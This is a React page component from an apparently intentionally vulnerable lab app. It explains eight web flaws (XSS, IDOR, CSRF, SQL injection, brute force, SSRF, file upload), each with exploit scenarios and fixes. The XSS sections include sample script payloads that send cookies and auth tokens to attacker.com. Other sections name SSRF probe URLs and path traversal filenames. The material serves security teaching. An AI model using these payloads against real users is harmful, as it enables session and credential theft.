import { Navigate, Link } from 'react-router-dom';
import '../styles/vulnerabilities.css';

function Vulnerabilities({ labMode }) {
  if (!labMode) {
    return <Navigate to="/" replace />;
  }

  return (
    <div className="vulnerabilities-page">
      <div className="vuln-hero">
        <div>
          <h1>Vulnerabilities (Lab Mode Only)</h1>
          <p className="lead">
            High-level notes on intentionally vulnerable behaviors in Lab Mode. Secure Mode keeps protections on; Lab Mode relaxes them so you can observe the difference.
          </p>
        </div>
      </div>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #1: Reflected XSS in Message Preview</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the Spam Detector preview renders user input as HTML using React's dangerouslySetInnerHTML, which tells the browser to interpret the content as HTML markup rather than plain text. When you submit a message like {'<b>bold</b>'}, the browser sees the {'<b>'} tags and renders them as formatting instructions, making text bold. The critical flaw: the application trusts user input to be safe HTML, but users can inject any HTML they want, including malicious JavaScript. The browser cannot distinguish between HTML intended by the developer and HTML injected by an attacker. It executes both equally. This breaks the fundamental security principle: never trust user input. In Secure Mode, user input is treated as plain text, so {'<b>bold</b>'} is displayed literally as characters, not interpreted as markup.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                When user input is rendered as HTML, the browser's HTML parser processes it and creates DOM elements. If the input contains JavaScript (like {'<script>alert("XSS")</script>'}), the browser executes it in the context of the page. This means the malicious code runs with the same privileges as the legitimate application code. It can access cookies, localStorage, session tokens, and make API requests on behalf of the user. The attack is called "Reflected" XSS because the malicious payload is reflected back to the user in the same HTTP response that processes their input. The payload doesn't persist in storage. It only executes when the user submits the malicious input and views the result. An attacker typically crafts a URL with the malicious payload as a parameter, then tricks the victim into clicking it. The key vulnerability: the application takes untrusted user input and inserts it directly into the HTML output without sanitization or encoding.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) An attacker crafts a malicious message containing JavaScript: {'<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'}. (2) The attacker creates a shortened URL that includes this payload as a parameter, or embeds it in an email or forum post. (3) A victim receives the link and clicks it, thinking it's a legitimate spam check. (4) The victim's browser sends a request to the Spam Detector with the malicious payload. (5) In Lab Mode, the application renders the payload as HTML in the message preview. (6) The browser's HTML parser encounters the {'<script>'} tag and executes the JavaScript. (7) The malicious script steals the victim's session cookie and sends it to the attacker's server. (8) The attacker now has the victim's session token and can impersonate them. In real applications, this could steal authentication tokens, redirect users to phishing sites, deface pages, or perform actions on behalf of the user. The attack happens immediately when the page loads. The victim doesn't need to click anything else.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Render user input as plain text, not HTML. In Secure Mode, React renders content using text nodes instead of dangerouslySetInnerHTML. This means special characters like {'<'} and {'>'} are displayed literally as characters, not interpreted as HTML tags. The technical term is "HTML escaping" or "encoding": characters that have special meaning in HTML (like {'<'} becomes {'&lt;'}, {'>'} becomes {'&gt;'}, {'&'} becomes {'&amp;'}) are converted to their HTML entity equivalents. When the browser sees {'&lt;b&gt;'}, it displays it as the literal text "{'<b>'}" rather than creating a bold tag. This ensures that user input can never be interpreted as code. The fix is simple: never use dangerouslySetInnerHTML with user input. Always use React's default text rendering, which automatically escapes HTML. If you need to display formatted content, use a sanitization library that only allows safe HTML tags (like bold, italic) while stripping out dangerous elements (like script tags, event handlers, and JavaScript URLs).
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/spam-detector">Spam Detector</Link>, switch between Secure and Lab modes, and submit a message with harmless formatting tags (e.g., {'<b>Hello</b>'}). Notice that Secure Mode shows the tags literally, while Lab Mode renders the formatting.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #2: Stored XSS in Saved Analyses</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the Saved Analyses detail view renders stored message text as HTML using dangerouslySetInnerHTML. When a user saves an analysis, the message text is stored in the database exactly as submitted. Later, when viewing the saved analysis, the application retrieves this stored text and renders it as HTML. The critical flaw: the application trusts that data stored in the database is safe to render as HTML, but the database is just storage. It doesn't validate or sanitize content. Malicious HTML saved today will execute tomorrow, next week, or whenever someone views it. Unlike Reflected XSS (which only affects the person who submits the payload), Stored XSS affects anyone who views the stored content. The payload persists in the database and executes every time the saved item is displayed, making it more dangerous because it can affect multiple victims over an extended period without the attacker needing to be present.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker submits a message containing malicious JavaScript and saves it as an analysis. The payload is stored in the database as-is (e.g., {'<script>malicious_code()</script>'}). When any user (including the attacker, other users, or administrators) views this saved analysis later, the application retrieves the stored text and renders it as HTML. The browser's HTML parser processes the malicious script tag and executes the JavaScript in the context of the viewing user's session. This means the code runs with the privileges of whoever is viewing the page, not the attacker who created it. The attack is called "Stored" XSS because the payload persists in the application's storage (database) and executes whenever the stored content is displayed. Unlike Reflected XSS, the victim doesn't need to click a malicious link. They just need to view a saved analysis that contains the payload. The attack can spread automatically: if the malicious analysis appears in a list that many users view, it executes for all of them.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) An attacker creates an account and saves an analysis with a malicious payload: {'<script>fetch("http://attacker.com/steal?data="+localStorage.getItem("auth_token"))</script>'}. (2) The payload is saved to the database with ID 42. (3) Days or weeks later, an administrator logs in to review user analyses. (4) The admin views analysis ID 42 from their dashboard. (5) In Lab Mode, the application renders the stored message as HTML, and the browser executes the script. (6) The malicious JavaScript steals the admin's authentication token from localStorage and sends it to the attacker's server. (7) The attacker now has admin credentials and can access the entire system. Alternatively, the payload could execute for every regular user who views their saved analyses list, stealing their tokens en masse. The key difference from Reflected XSS: the payload doesn't need to be in a URL or submitted in the same session. It's already in the database, waiting to execute whenever someone views it. This makes Stored XSS particularly dangerous for applications with shared content or admin review features.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Render stored user input as plain text, never as HTML. In Secure Mode, saved messages are displayed using React's default text rendering, which automatically escapes HTML entities. The data can be stored in the database exactly as submitted (no need to sanitize on input), but it must be escaped when displayed. This follows the principle: store raw data, display safely. When rendering, convert special HTML characters to their entity equivalents: {'<'} becomes {'&lt;'}, {'>'} becomes {'&gt;'}, {'&'} becomes {'&amp;'}, quotes become {'&quot;'} or {'&#39;'}. This ensures that even if malicious HTML is stored in the database, it will be displayed as harmless text when retrieved. The fix is the same as Reflected XSS: never use dangerouslySetInnerHTML with user-controlled data. Always use React's default rendering, which escapes HTML automatically. If you need to display formatted content from trusted sources, use a Content Security Policy (CSP) to restrict what JavaScript can execute, and consider using a sanitization library that only allows safe HTML tags while stripping dangerous elements. Remember: the database is just storage. It doesn't make data safe. Safety comes from how you render it.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/spam-detector">Spam Detector</Link>, submit a message with formatting tags (e.g., {'<b>test</b>'}), save the analysis, then view it in both Secure and Lab modes. Notice that Secure Mode shows the tags literally in the saved analysis detail view, while Lab Mode renders the formatting.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #3: IDOR in Saved Analyses Access</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                IDOR stands for Insecure Direct Object Reference. In Lab Mode, the API doesn't verify resource ownership when accessing saved analyses. The critical flaw: the application trusts client-provided resource identifiers (like analysis IDs) without verifying that the requesting user has permission to access that specific resource. When you request analysis ID 5, the server returns it without checking if it belongs to you. The list endpoint returns all analyses from all users, not just yours. The detail endpoint allows access to any analysis by ID without ownership verification. This breaks the fundamental security principle: never trust client-provided identifiers for access control. The server must independently verify that the user has permission to access the requested resource. In Secure Mode, the server checks the user_id field in the database against the authenticated user's ID before returning any data. If they don't match, access is denied with a 403 Forbidden response.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker can enumerate and access resources belonging to other users through two methods: (1) ID enumeration: The attacker saves their own analysis and receives ID 5. They then modify the request to access IDs 4, 3, 2, 1, or 6, 7, 8, etc. In Lab Mode, the server returns these analyses without checking ownership. (2) List endpoint exposure: The attacker calls the list endpoint and receives all analyses from all users, not just their own. They can then use any ID from the list to access detailed information. The attack works because the API trusts the client-provided analysis ID parameter. The server assumes that if you can provide an ID, you must have permission to access it. This is a false assumption. IDs are just numbers, and anyone can guess or enumerate them. The server must verify ownership server-side by checking the resource's user_id against the authenticated user's ID. Client-provided data (including IDs, user IDs in headers, or any parameters) can be manipulated and cannot be trusted for access control decisions.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) Alice creates an account and saves several analyses, receiving IDs 10, 11, and 12. (2) Bob creates an account and saves one analysis, receiving ID 13. (3) Bob wants to see Alice's analyses, so he modifies his browser request from GET /analysis/13 to GET /analysis/12. (4) In Lab Mode, the server doesn't check ownership. It just returns analysis 12, which belongs to Alice. (5) Bob can now read Alice's saved messages, which might contain personal or sensitive information. (6) Bob continues enumerating: he tries IDs 11, 10, 9, 8, etc., accessing analyses from multiple users. (7) Alternatively, Bob calls GET /analysis/list and receives all analyses from all users, giving him a complete list of IDs to target. In a real application, this could expose private messages, financial data, medical records, or business communications. The attack is particularly dangerous because it's silent. The victim never knows their data was accessed. Bob doesn't need Alice's password or any special privileges. He just needs to guess or enumerate resource IDs.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Always verify resource ownership server-side before returning any data. In Secure Mode, the fix involves two changes: (1) List endpoint: Filter results by the authenticated user's ID. The SQL query becomes SELECT * FROM saved_analyses WHERE user_id = ? with the authenticated user's ID as the parameter. This ensures users only see their own analyses. (2) Detail endpoint: Check ownership before returning the resource. When a user requests analysis ID 5, the server first retrieves it from the database, then checks if analysis.user_id equals authenticated_user.id. If they match, return the analysis. If they don't match, return 403 Forbidden. Never trust client-provided identifiers. Always verify ownership using server-side data. The authenticated user's ID comes from the JWT token (server-validated), and the resource's owner comes from the database (server-controlled). Compare these two server-side values to make access control decisions. Additionally, avoid exposing sequential IDs if possible (use UUIDs instead), and implement rate limiting to prevent automated enumeration attacks. Remember: access control must be enforced on the server. The client cannot be trusted to enforce its own restrictions.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/spam-detector">Spam Detector</Link> in Lab Mode, save an analysis, then use the "Clear User ID" button to switch to a different user account. Notice that you can still see and access analyses from the previous user. In Secure Mode, switching users hides other users' analyses and blocks access to their details.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #4: CSRF (Cross-Site Request Forgery)</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the backend accepts state-changing requests (like saving analyses) without verifying user intent. Here's the critical distinction: Authentication proves identity (who you are), but CSRF protection proves intent (that you actually wanted to perform this action). When you log in, the server gives you a session token (JWT) that proves you're authenticated. However, this same token is automatically sent by your browser with every request to that domain, even if the request comes from a malicious website. Without CSRF tokens, the server cannot distinguish between a legitimate user clicking "Save Analysis" in the app versus a malicious website automatically submitting that same request using your session. The server sees a valid authenticated request in both cases, but only one represents actual user intent.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                The attack works because browsers automatically include authentication cookies or tokens with requests to the same domain, regardless of where the request originates. An attacker creates a malicious website containing hidden code (like an auto-submitting form or JavaScript fetch request) that targets your application's API endpoint. When a logged-in user visits the attacker's site, the malicious code automatically sends a POST request to save an analysis. The browser includes the user's session token in the request headers, so the server sees a valid authenticated request. In Lab Mode, the backend doesn't check for a CSRF token, so it accepts the request as legitimate. The attacker never needs to know the user's password or session token. They just trick the browser into sending it automatically. This is why CSRF is called "Cross-Site" Request Forgery: the request is forged on a different site (the attacker's) but executed using the victim's authenticated session.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) Alice logs into the Spam Detector application at localhost:5173, receiving a JWT token stored in her browser. (2) Alice receives an email with a link to a "free spam checker tool" on attacker.com. (3) Alice clicks the link and visits attacker.com. (4) The attacker's page contains hidden JavaScript that automatically sends a POST request to localhost:8000/analysis/save with malicious data. (5) Alice's browser automatically includes her JWT token in the request headers (same-origin policy allows this for same-domain requests). (6) In Lab Mode, the server sees a valid authenticated request and saves the analysis without checking for a CSRF token. (7) Alice's account now contains unwanted data she never intended to save. In a real application, this could be used to change email addresses, transfer funds, delete data, or perform any state-changing action. The key insight: Alice never clicked "Save" in the legitimate app. The attacker's website did it automatically using her authenticated session.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Require a CSRF token for all state-changing requests (POST, PUT, PATCH, DELETE). The CSRF token is a secret value that only the legitimate application knows. Here's how it works: (1) When a user logs in, the server generates a unique CSRF token and associates it with their session. (2) The token is returned to the client (in the login response or via /auth/session endpoint). (3) The legitimate application stores this token and includes it in the X-CSRF-Token header for every state-changing request. (4) In Secure Mode, the backend validates that the token in the request header matches the token stored for that user's session. (5) If they match, the request is legitimate (it came from the app). If they don't match or are missing, the request is rejected. This works because malicious websites cannot read the CSRF token due to the Same-Origin Policy. They can send requests with your session token, but they can't read the CSRF token from your legitimate app to include it in their forged requests. The token acts as proof that the request originated from the application itself, not from a third-party site.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/spam-detector">Spam Detector</Link> and log in. In Lab Mode, try the "Test: Save (No CSRF)" button. Notice it succeeds without a CSRF token. In Secure Mode, the same action is blocked. Use browser DevTools to inspect the request headers: Secure Mode includes the X-CSRF-Token header, while Lab Mode allows requests without it.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #5: SQL Injection (Login)</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the login authentication function constructs database queries by directly inserting user input into SQL strings using string interpolation. When a user attempts to log in, the application builds the query by concatenating the username input directly into the SQL statement. The critical flaw: the application trusts that user input will always be safe data, but the database cannot distinguish between legitimate username values and malicious SQL commands when they're embedded in the query string. This breaks the fundamental security principle: never trust user input, especially when constructing database queries. The database parser sees the entire query as executable SQL code, including any injected commands. In Secure Mode, the application uses parameterized queries (prepared statements) where the SQL structure is defined separately from the data. User input is passed as parameters, and the database driver automatically handles escaping and type conversion, ensuring the input is always treated as data, never as executable SQL code.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker can manipulate the login form fields to inject SQL code that modifies the query's logic. When the application builds the query using string interpolation, injected SQL becomes part of the executable query structure. The database parser processes the entire string as SQL, executing both the intended query logic and any injected commands. This allows attackers to bypass authentication checks, retrieve unauthorized data, or manipulate database operations. The attack works because the application fails to separate SQL structure (the query template) from SQL data (user input). In Lab Mode, both are combined into a single string that the database interprets as code. The database has no way to know which parts were intended by the developer and which parts were injected by an attacker - it executes everything equally. More sophisticated attacks can extract data from other tables, enumerate usernames, or perform time-based inference attacks to learn about the database structure. The vulnerability exists at the query construction layer: the moment user input is inserted into a SQL string, the trust boundary is broken.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                An attacker visits the login page and submits manipulated input in the username or password fields. In Lab Mode, the application constructs the user lookup query by directly inserting this input into the SQL string. The database receives and executes the modified query, which may include injected conditions that always evaluate to true, allowing the query to match users regardless of the actual credentials. The application may then authenticate the attacker based on the manipulated query results. In a real application, this could lead to complete account takeover, unauthorized access to user data, or database manipulation. The attack is particularly dangerous because it can be automated and doesn't require special tools - just a web browser and understanding of SQL syntax. The vulnerability demonstrates the critical importance of the trust boundary between user input and database query construction. Once user input is trusted inside SQL, the entire authentication mechanism becomes unreliable.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Always use parameterized queries (prepared statements) for all database operations involving user input. In Secure Mode, the application uses parameterized queries where the SQL structure is fixed and user input is passed as separate parameters. The database driver handles escaping, type conversion, and injection prevention automatically. The key principle: separate SQL structure (the query template) from SQL data (user input). Never use string formatting, concatenation, or interpolation to build SQL queries with user input. Parameterized queries ensure that user input is always treated as data, never as executable code. Even if an attacker submits malicious input, the database will search for that exact string as a username value, not interpret it as SQL commands. This is the standard defense against SQL injection across all database systems. Additionally, implement input validation (length limits, character restrictions) and follow the principle of least privilege for database user permissions. Remember: the database cannot distinguish between legitimate and malicious SQL if you give it the opportunity to execute both. Parameterized queries prevent malicious SQL from ever reaching the database parser by maintaining a strict separation between code and data.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/login">Login</Link> page and enable Lab Mode. Notice the difference in how the backend constructs database queries when you attempt to log in. In Secure Mode, the backend uses parameterized queries that treat all input as data. In Lab Mode, the backend uses string interpolation that allows SQL injection. Check your backend terminal logs to see the vulnerable query construction in Lab Mode versus the secure parameterized approach in Secure Mode.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #6: Weak Authentication (Brute Force)</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the login authentication function does not implement rate limiting or account lockout mechanisms. When a user attempts to log in with incorrect credentials, the application processes the request without tracking or limiting failed attempts. The critical flaw: the application allows unlimited failed login attempts without any protective measures, making it vulnerable to brute force attacks. An attacker can systematically try different username and password combinations without being blocked or slowed down. This breaks the fundamental security principle: authentication systems must implement protective measures to prevent automated guessing attacks. In Secure Mode, the application implements rate limiting that tracks failed login attempts per user. After three consecutive failed attempts, the account is temporarily locked for 30 seconds, preventing further authentication attempts during that period. This creates a significant barrier to brute force attacks by making them time-consuming and impractical.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker can systematically attempt to guess user credentials by submitting many different username and password combinations. Without rate limiting, each failed attempt is processed immediately, allowing the attacker to try hundreds or thousands of combinations in a short period. The attack works because the application processes every login request without tracking patterns or implementing delays. In Lab Mode, there is no mechanism to detect or prevent repeated failed attempts from the same source. The attacker can automate the process using scripts or tools that rapidly submit login requests with different credentials. More sophisticated attacks can use wordlists of common passwords, dictionary attacks, or credential stuffing (using leaked credentials from other breaches). The vulnerability exists at the authentication layer: the absence of rate limiting means the application cannot distinguish between legitimate users making occasional mistakes and attackers systematically trying to break in. The attack is particularly effective because it requires no special knowledge—just persistence and automation.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                An attacker identifies a target user account (e.g., "admin" or a known username) and begins a brute force attack. In Lab Mode, the attacker uses an automated tool to submit login requests rapidly, trying common passwords like "password", "123456", "admin", or variations. The application processes each request immediately, returning "Incorrect username or password" for failed attempts. The attacker can try hundreds of passwords per minute without any restrictions. After several hours or days of automated attempts, the attacker successfully guesses the correct password and gains access to the account. In a real application, this could lead to complete account takeover, unauthorized access to sensitive data, or privilege escalation if the compromised account has administrative rights. The attack is particularly dangerous because it can be completely automated and run continuously until successful. The victim may not notice the attack until their account is compromised, as failed login attempts don't trigger any alerts or visible indicators. In Secure Mode, the same attack would be blocked after three failed attempts, forcing the attacker to wait 30 seconds between each set of attempts, making the attack impractical and time-consuming.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Implement rate limiting and account lockout mechanisms for authentication attempts. In Secure Mode, the application tracks failed login attempts per user identifier (combining IP address and username to prevent one user from blocking others). After three consecutive failed attempts, the account is temporarily locked for 30 seconds, preventing further authentication attempts during that period. The rate limiting system records each failed attempt and checks the lockout status before processing new login requests. If a lockout is active, the request is rejected with a clear message indicating how long the user must wait. After the lockout period expires, the attempt counter is reset, allowing legitimate users to try again. This creates a significant barrier to brute force attacks by making them time-consuming and impractical. Additionally, consider implementing progressive delays (increasing wait times after more attempts), CAPTCHA challenges after multiple failures, or account lockout notifications to alert users of potential attacks. The key principle: authentication systems must implement protective measures that make brute force attacks impractical. Rate limiting is a standard defense that balances security with usability, allowing legitimate users to recover from mistakes while preventing automated attacks.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/login">Login</Link> page and attempt to log in with incorrect credentials. In Secure Mode (without the "Test in Lab Mode" checkbox), try logging in incorrectly three times. Notice that after the third failed attempt, you receive a message indicating you must wait 30 seconds before trying again. In Lab Mode (with the checkbox enabled), you can attempt unlimited failed logins without any restrictions. This demonstrates how the absence of rate limiting makes brute force attacks possible.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #7: Server-Side Request Forgery (SSRF)</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the Spam Detector accepts URLs as input and fetches them without strict validation of the destination. When a user submits a message that is detected as a URL (starting with http:// or https://), the backend makes an HTTP request to fetch the URL content. The critical flaw: in Lab Mode, the application only performs basic scheme validation (ensuring http/https) but doesn't validate the destination hostname or IP address. This allows users to request URLs pointing to internal, private, or localhost addresses that should never be accessible from the server. The application trusts user-provided URLs without verifying they point to safe, external destinations. This breaks the fundamental security principle: never trust user input, especially when it controls network requests. In Secure Mode, the application performs strict validation: it only allows http/https schemes, blocks common internal hostnames (localhost, 127.0.0.1), resolves DNS to check resolved IP addresses, and blocks private, loopback, link-local, reserved, and multicast IP ranges. This prevents the server from making requests to internal services that should not be exposed.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker can submit URLs pointing to internal services that are not intended to be accessible from the server. When the application fetches these URLs, it makes requests from the server's network context, not the attacker's browser. This means the server can access internal services that are protected by firewalls or network segmentation. The attack works because the application trusts user-provided URLs and makes requests without validating the destination. In Lab Mode, an attacker can submit URLs like http://localhost:8000/, http://127.0.0.1:3306/, http://192.168.1.1/, or http://169.254.169.254/ (cloud metadata services). The server will attempt to fetch these URLs, potentially exposing internal services, database ports, admin panels, or cloud metadata. More sophisticated attacks can use DNS rebinding, protocol smuggling, or URL encoding to bypass basic validation. The vulnerability exists at the URL validation layer: the moment user input controls where the server makes network requests, the trust boundary is broken. The server's network position gives it access to resources that should never be reachable from external users.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) An attacker discovers that the Spam Detector accepts URLs and fetches them for analysis. (2) The attacker knows that the server is likely running on localhost and may have other services accessible on the internal network. (3) In Lab Mode, the attacker submits http://localhost:8000/ as the message text. (4) The backend detects this is a URL and attempts to fetch it without strict validation. (5) The server successfully connects to its own API endpoint (localhost:8000), proving the SSRF vulnerability. (6) The attacker then tries http://127.0.0.1:3306/ to probe for a MySQL database, or http://169.254.169.254/latest/meta-data/ to access cloud metadata (AWS, Azure, GCP). (7) If successful, the attacker can read internal service responses, enumerate open ports, access cloud metadata (which may contain credentials or instance information), or interact with internal APIs that should never be exposed. In a real application, this could lead to complete infrastructure compromise, credential theft from cloud metadata services, database access, or lateral movement within the internal network. The attack is particularly dangerous because it uses the server's privileged network position to access resources that are protected from external access. The attacker never needs to directly access these services—they trick the server into accessing them on their behalf.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Always validate URL destinations before making server-side requests. In Secure Mode, the application implements strict validation: (1) Only allow http and https schemes (block file://, gopher://, etc.). (2) Block common internal hostnames (localhost, 127.0.0.1, 0.0.0.0, ::1, localhost.localdomain). (3) Resolve DNS and check all resolved IP addresses against private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, etc.). (4) Block loopback, link-local, reserved, and multicast IP addresses. (5) Use an allowlist of permitted domains if possible, rather than trying to block all dangerous destinations. The key principle: never trust user-provided URLs. Always validate the destination using server-side checks that resolve DNS and verify IP addresses. The validation must happen server-side because the client cannot be trusted. Additionally, implement request timeouts, size limits, and consider using a proxy or allowlist for external requests. If URL fetching is necessary, consider using a separate service with restricted network access or a dedicated proxy that enforces security policies. Remember: the server's network position gives it access to internal resources. User-controlled URLs must be validated to prevent the server from accessing resources it shouldn't.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
              Go to the <Link to="/spam-detector">Spam Detector</Link> and log in. In Secure Mode (Lab Mode OFF), try submitting a URL like http://localhost:8000/ or http://127.0.0.1:8000/. Notice that you receive an error message indicating the URL validation failed because internal hostnames are not allowed. Then toggle to Lab Mode (Lab Mode ON) and submit the same URL. Notice that the request succeeds and the server fetches the URL, demonstrating the SSRF vulnerability. You can also try public URLs like https://www.example.com in both modes - they should work in both, showing that Secure Mode only blocks dangerous internal destinations.
            </p>
          </div>
        </div>
      </section>

      <section className="vuln-section">
        <div className="vuln-card">
          <p className="vuln-label">Vulnerability #8: Insecure File Upload (TXT Upload)</p>
          <div className="vuln-grid">
            <div className="vuln-tile">
              <h3>❌ What went wrong</h3>
              <p>
                In Lab Mode, the file upload feature for .txt files relaxes validation in multiple ways. The critical flaws: (1) MIME type validation is skipped - the application only checks the filename extension (.txt) and trusts it, but extensions can be easily spoofed. A file can have a .txt extension but actually contain executable code, binary data, or malicious content. (2) The file size limit is increased from 100KB to 10MB, allowing attackers to upload much larger files that could exhaust server resources or contain extensive malicious payloads. (3) Files are stored using the original filename provided by the user, without sanitization or path validation. This makes the application vulnerable to path traversal attacks (using filenames like "../../../etc/passwd") and filename-based attacks. The application trusts user-provided filenames and file metadata without proper validation. In Secure Mode, the application performs strict validation: it requires both .txt extension AND text/plain MIME type verification, enforces a 100KB size limit, processes files in memory without storing them, and never trusts user-provided filenames. This prevents malicious file uploads, storage attacks, and resource exhaustion.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>🔍 How it's exploited</h3>
              <p>
                An attacker can exploit the relaxed validation in multiple ways: (1) MIME type spoofing: Upload a file with a .txt extension but actual content that is not plain text (e.g., a PHP script renamed to "malicious.php.txt" or a binary file). In Lab Mode, the application only checks the extension, so it accepts the file. The server then processes or stores this file, potentially executing malicious code if the file is later accessed or processed incorrectly. (2) Size-based attacks: Upload very large files (up to 10MB) to exhaust server disk space, memory, or processing resources. This can lead to denial of service or system instability. (3) Filename-based attacks: Use malicious filenames like "../../../etc/passwd.txt" to attempt path traversal, overwrite system files, or access sensitive directories. The application stores files using the original filename without sanitization, so a path traversal attempt could write files outside the intended upload directory. (4) Storage attacks: Store malicious files on the server that could be accessed later, used for persistent attacks, or combined with other vulnerabilities. The vulnerability exists at the file validation and storage layer: the moment user input controls file metadata and storage paths, the trust boundary is broken.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>⚠️ Realistic attack scenario</h3>
              <p>
                Step-by-step: (1) An attacker discovers the file upload feature accepts .txt files for spam analysis. (2) The attacker creates a malicious file containing PHP code (e.g., a web shell) and renames it to "analysis.txt" to bypass extension checks. (3) In Lab Mode, the attacker uploads this file. The application only checks the .txt extension, skips MIME type validation, and accepts the file. (4) The file is stored in the uploads/ directory using the original filename "analysis.txt". (5) If the application later serves uploaded files or processes them insecurely, the malicious code could be executed. Alternatively, the attacker uploads a file named "../../../backend/config.txt" to attempt path traversal and overwrite configuration files. (6) The attacker could also upload a 10MB file filled with data to exhaust server resources, causing denial of service for other users. (7) In a real application, this could lead to remote code execution, system file access, data exfiltration, or complete server compromise. The attack is particularly dangerous because it combines multiple weaknesses: trusting filenames, skipping content validation, and storing files with user-controlled names. Once a malicious file is stored, it becomes a persistent threat that can be exploited later, even if the upload vulnerability is fixed.
              </p>
            </div>
            <div className="vuln-tile">
              <h3>✅ How it should be fixed</h3>
              <p>
                Always validate file uploads using multiple layers of security. In Secure Mode, the application implements strict validation: (1) Verify both file extension AND MIME type - don't trust either alone. Check that the file extension matches the actual content type by examining file headers (magic bytes) or MIME type detection. (2) Enforce strict size limits appropriate for the use case (100KB for text analysis is reasonable). (3) Process files in memory and discard them immediately - never store uploaded files unless absolutely necessary. If storage is required, use server-generated random filenames (UUIDs) instead of user-provided names. (4) Sanitize and validate filenames: remove path components (../), special characters, and ensure filenames are safe. Never use user-provided filenames directly in file system operations. (5) Validate file content: read the file and verify it matches the expected format (UTF-8 text for .txt files). Don't trust file metadata - verify the actual content. (6) Store files outside the web root if possible, or use a content delivery network (CDN) with proper access controls. (7) Implement file type detection using magic bytes or content analysis, not just extensions or MIME types. The key principle: never trust user-provided file metadata. Always validate file content, use server-controlled filenames, and minimize file storage. If file uploads are necessary, implement a whitelist of allowed file types, scan uploaded files for malware, and restrict file access with proper permissions.
              </p>
            </div>
          </div>

          <div className="try-it-card">
            <h3>Try it</h3>
            <p>
